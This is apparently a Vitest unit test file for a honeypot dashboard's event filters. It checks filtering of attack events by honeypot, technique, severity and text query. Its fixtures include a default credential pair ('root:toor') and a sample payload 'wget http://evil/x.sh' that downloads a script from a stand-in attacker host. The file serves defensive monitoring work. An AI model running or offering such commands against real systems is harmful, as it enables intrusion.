import { describe, expect, it } from "vitest";
import { filterEvents, matchesFilters } from "./severity";
import type { FeedFilters } from "@/store/ui";
import type { AttackEvent } from "@/types/api";

const baseFilters: FeedFilters = {
  honeypot: "all",
  technique: "all",
  severity: "all",
  query: "",
};

function makeEvent(overrides: Partial<AttackEvent> = {}): AttackEvent {
  return {
    id: crypto.randomUUID(),
    honeypot_id: "cowrie-ssh-01",
    honeypot_type: "cowrie",
    attacker_ip: "203.0.113.45",
    geo: { country: "RU", city: "Moscow", lat: 0, lon: 0, asn: "AS1", org: "Example ISP" },
    reputation: { abuseipdb_score: 80, known_malicious: true },
    event_type: "login_attempt",
    technique: "brute_force",
    mitre_attck_id: "T1110",
    payload: "root:toor",
    session_id: "sess-1",
    timestamp: new Date().toISOString(),
    severity: "high",
    ...overrides,
  };
}

describe("matchesFilters", () => {
  it("matches everything when all filters are 'all' and query is empty", () => {
    expect(matchesFilters(makeEvent(), baseFilters)).toBe(true);
  });

  it("filters by honeypot id", () => {
    const event = makeEvent({ honeypot_id: "wp-decoy-01" });
    expect(matchesFilters(event, { ...baseFilters, honeypot: "cowrie-ssh-01" })).toBe(false);
    expect(matchesFilters(event, { ...baseFilters, honeypot: "wp-decoy-01" })).toBe(true);
  });

  it("filters by technique", () => {
    const event = makeEvent({ technique: "cve_exploit_attempt" });
    expect(matchesFilters(event, { ...baseFilters, technique: "brute_force" })).toBe(false);
    expect(matchesFilters(event, { ...baseFilters, technique: "cve_exploit_attempt" })).toBe(true);
  });

  it("filters by severity", () => {
    const event = makeEvent({ severity: "critical" });
    expect(matchesFilters(event, { ...baseFilters, severity: "low" })).toBe(false);
    expect(matchesFilters(event, { ...baseFilters, severity: "critical" })).toBe(true);
  });

  it("matches a free-text query against ip, geo, payload, or MITRE id, case-insensitively", () => {
    const event = makeEvent({ attacker_ip: "198.51.100.7", payload: "wget http://evil/x.sh" });
    expect(matchesFilters(event, { ...baseFilters, query: "198.51.100.7" })).toBe(true);
    expect(matchesFilters(event, { ...baseFilters, query: "WGET" })).toBe(true);
    expect(matchesFilters(event, { ...baseFilters, query: "T1110" })).toBe(true);
    expect(matchesFilters(event, { ...baseFilters, query: "no-match-here" })).toBe(false);
  });

  it("combines multiple filters with AND semantics", () => {
    const event = makeEvent({ honeypot_id: "rdp-decoy-01", severity: "critical" });
    expect(
      matchesFilters(event, { ...baseFilters, honeypot: "rdp-decoy-01", severity: "critical" }),
    ).toBe(true);
    expect(
      matchesFilters(event, { ...baseFilters, honeypot: "rdp-decoy-01", severity: "low" }),
    ).toBe(false);
  });
});

describe("filterEvents", () => {
  it("returns only the events matching the filter set", () => {
    const events = [
      makeEvent({ severity: "low" }),
      makeEvent({ severity: "critical" }),
      makeEvent({ severity: "critical" }),
    ];
    const result = filterEvents(events, { ...baseFilters, severity: "critical" });
    expect(result).toHaveLength(2);
    expect(result.every((e) => e.severity === "critical")).toBe(true);
  });
});
